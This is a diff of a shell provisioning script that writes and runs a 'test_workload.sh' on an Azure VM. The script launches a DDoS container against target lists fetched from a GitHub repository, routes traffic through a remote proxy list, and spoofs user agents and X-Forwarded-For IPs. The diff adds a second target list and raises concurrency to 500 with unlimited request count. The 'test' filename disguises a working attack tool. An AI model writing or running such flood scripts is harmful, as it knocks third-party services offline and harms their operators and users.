@@ -8,6 +8,7 @@ BACKUP_SUFFIX=$(date +"%F_%H%M") # log retention suffix
 
 # DDOSER_VARS
 TARG_URL="https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt"
+TARG_URL2="https://raw.githubusercontent.com/hem017/cytro/master/special_targets.txt"
 USER_AGENTS="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
 
 
@@ -33,25 +34,30 @@ rotate_file () {
 
 # creating new log and rotating
 mkdir -p $LOG_DIR
+if [ -n "$(docker ps -q)" ]; then
+    for p in $(docker ps -q); do
+      echo -e "\n==== CLENAUP STALE $c ====" | tee -a $LOG_PATH
+      docker logs $p | tee -a $LOG_PATH 2>&1
+      docker kill $p | tee -a $LOG_PATH
+      echo "=====" | tee -a $LOG_PATH
+    done
+fi
 rotate_file "${LOG_PATH}" $LOG_RETENTION "logs"
 echo -e "==== START $(date +"%F %H:%M") ====\n" | tee -a $LOG_PATH
 
-if [ -n "$(docker ps -q)" ]; then
-  docker kill $(docker ps -q) 2>&1 | tee -a $LOG_PATH
-fi
 docker run --pull always \
         --ulimit nofile=100000:100000 \
         -d --rm imsamurai/ddoser \
-        --concurrency 150 \
-        --timeout 60 \
+        --concurrency 500 \
+        --timeout 20 \
         --with-random-get-param \
         --user-agent "$USER_AGENTS" \
         --count 0 \
         --log-to-stdout \
         --target-urls-file $TARG_URL \
+        --target-urls-file $TARG_URL2 \
         --proxy-url "http://143.244.166.15/proxy.list" \
         --restart-period 600 \
         --random-xff-ip | tee -a $LOG_PATH' > /home/azureuser/test_workload.sh
 
 chmod +x /home/azureuser/test_workload.sh
-
